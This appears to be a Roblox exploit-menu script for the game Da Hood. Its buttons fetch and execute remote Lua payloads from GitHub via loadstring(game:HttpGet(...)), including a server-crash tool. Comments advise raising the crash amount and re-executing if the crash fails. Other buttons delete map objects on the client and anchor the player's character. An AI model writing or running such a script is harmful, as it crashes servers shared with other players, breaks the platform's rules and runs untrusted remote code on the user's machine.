local amount = TextBox.Text

btn2.MouseButton1Down:Connect(function()
	local pp = game.Workspace["Ignored"]
	local titi = game.Workspace["MAP"]
	local pepe = game.Workspace["Players"]

	pp:Destroy()
	titi:Destroy()
	pepe:Destroy()
end)

btn1.MouseButton1Down:Connect(function()
	getgenv().Active = true --Toggle true or false
	getgenv().CrashAmmount = amount --The more you add the better
--[[ Theres a chance that the crash fails, if that happends just re execute and
     add more to CrashAmmount
      Requirements:
      Any PC, 5 minutes, account has to be in a group (it doesnt matter the group)
]]

	loadstring(game:HttpGet('https://raw.githubusercontent.com/GS21Official/Seller-Tools/main/GS21%20Dh%20Crash'))()
end)

btn3.MouseButton1Down:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/GS21Official/Seller-Tools/main/DaHood%20Cash%20Counter"))()
end)

btn4.MouseButton1Down:Connect(function()
	game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
end)

btn5.MouseButton1Down:Connect(function()
	game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
end)

-- Scripts:

local function AOBLY_fake_script() -- Main.wew 
	local script = Instance.new('LocalScript', Main)

	frame = script.Parent
	frame.Draggable = true
	frame.Active = true
	frame.Selectable = true
	
	game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "Loaded!";
		Text = "Enjoy Made By Zonoxy#00039 Credit To GS21!";
		Duration = 10;
	})
	
end
coroutine.wrap(AOBLY_fake_script)()
